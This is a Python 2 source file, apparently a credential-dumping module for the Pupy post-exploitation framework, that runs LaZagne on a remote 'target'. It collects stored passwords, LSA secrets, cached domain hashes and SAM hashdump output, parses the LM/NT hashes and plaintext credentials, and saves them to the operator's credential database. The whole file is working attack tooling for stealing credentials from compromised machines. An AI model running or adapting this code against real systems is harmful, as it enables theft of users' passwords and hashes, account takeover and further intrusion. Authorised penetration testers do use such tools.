# -*- coding: utf-8 -*-
# Author: AlessandroZ

from pupylib.PupyModule import *
from pupylib.PupyCompleter import *
from rpyc.utils.classic import upload
from pupylib.utils.credentials import Credentials
from pupylib.utils.term import colorize
import tempfile
import subprocess
import os.path
import sys

__class_name__="LaZagne"

@config(cat="creds", compat=["linux", "windows"])
class LaZagne(PupyModule):
    """
        retrieve passwords stored on the target
    """

    dependencies = {
        'all': [ 'sqlite3', '_sqlite3', 'xml', '_elementtree',
                     'calendar', 'xml', 'xml.etree',
                     'memorpy', 'ConfigParser', 'Crypto.Util.asn1', 'Crypto.PublicKey', 'lazagne', 'laZagne'],
        'windows': [ 'sqlite3.dll' ],
        'linux': [ 'secretstorage' ]
    }

    def init_argparse(self):
        header = '|====================================================================|\n'
        header += '|                                                                    |\n'
        header += '|                        The LaZagne Project                         |\n'
        header += '|                                                                    |\n'
        header += '|                          ! BANG BANG !                             |\n'
        header += '|                                                                    |\n'
        header += '|====================================================================|\n\n'

        self.arg_parser = PupyArgumentParser(prog="lazagne", description=header + self.__doc__)
        self.FILTER =''.join([(len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)])

    def run(self, args):
        db = Credentials(
            client=self.client.short_name(), config=self.config
        )

        first_user = True
        passwordsFound = False
        for r in self.client.conn.modules["laZagne"].runLaZagne():
            if r[0] == 'User':
                if not passwordsFound and not first_user:
                    print
                    self.warning("no passwords found !")

                first_user = False
                passwordsFound = False
                print colorize('\n########## User: %s ##########' % r[1].encode('utf-8', errors='replace'), "yellow")

            elif r[2]:
                passwordsFound = True
                self.print_results(r[0], r[1], r[2], db)

        if not passwordsFound:
            self.warning("no passwords found !")

        # clean temporary file if present
        self.client.conn.modules["laZagne"].clean_temporary_files()

    def print_module_title(self, module):
        print colorize("\n------------------- %s passwords -------------------\n" % module.encode('utf-8', errors="replace"), "yellow")

    # print hex value
    def dump(self, src, length=8):
        N=0; result=''
        while src:
            s,src = src[:length],src[length:]
            hexa = ' '.join(["%02X"%ord(x) for x in s])
            s = s.translate(self.FILTER)
            result += "%04X   %-*s   %s\n" % (N, length*3, hexa, s)
            N += length
        return result

    def print_results(self, success, module, creds, db):
        if success:
            clean_creds = []
            if module.lower() == 'lsa':
                if creds[0]:
                    self.print_module_title(module)

                for cred in creds:
                    for k in cred:
                        print k
                        print self.dump(cred[k], length=16)
            elif module.lower() == 'cachedump' or module.lower() == 'hashdump':
                if creds[0]:
                    self.print_module_title(module)

                for cred in creds:
                    for pwd in cred:
                        print pwd
                        
                        if module.lower() == 'hashdump':
                            try:
                                user, rid, lm, nt, _, _, _ = pwd.split(':')
                                clean_creds.append(
                                    { 
                                        'Category' : '%s' % module, 
                                        'CredType'  : 'hash',
                                        'Login'     : user, 
                                        'Hash'      : '%s:%s' % (str(lm), str(nt))
                                    }
                                )
                            except:
                                pass
                        
                        elif module.lower() == 'cachedump':
                            try:
                                user, d, dn, h = pwd.split(':')
                                clean_creds.append(
                                    { 
                                        'Category' : '%s' % module, 
                                        'CredType'  : 'hash',
                                        'Login'     : user, 
                                        'Hash'      : '%s:%s:%s:%s' % (user.lower(), h.encode('hex'), d.lower(), dn.lower())
                                    }
                                )
                            except:
                                pass
                    print
            else:
                self.print_module_title(module)
                for cred in creds:
                    clean_cred = { 'Category' : '%s' % module }
                    for c in cred.keys():
                        credvalue = cred[c]
                        if not type(credvalue) in (unicode, str):
                            credvalue = str(credvalue)
                        else:
                            try:
                                credvalue = credvalue.strip().decode('utf-8')
                            except:
                                credvalue = credvalue.strip()

                        clean_cred[c] = credvalue
                        try:
                            print u'%s: %s' % (c, clean_cred[c])
                        except:
                            print '%s: %s' % (c, clean_cred[c].encode('utf-8', errors="replace"))

                        if c == "Password":
                            clean_cred['CredType'] = 'plaintext'
                        elif c == 'Hash':
                            clean_cred['CredType'] = 'hash'
                    print

                    # manage when no password found
                    if 'CredType' not in clean_cred:
                        clean_cred['CredType'] = 'empty'
                    clean_creds.append(clean_cred)

            if clean_creds:
                try:
                    db.add(clean_creds)
                    self.success("Passwords stored on the database")
                except Exception, e:
                    print e
        else:
            # contains a stacktrace
            self.error(str(creds))
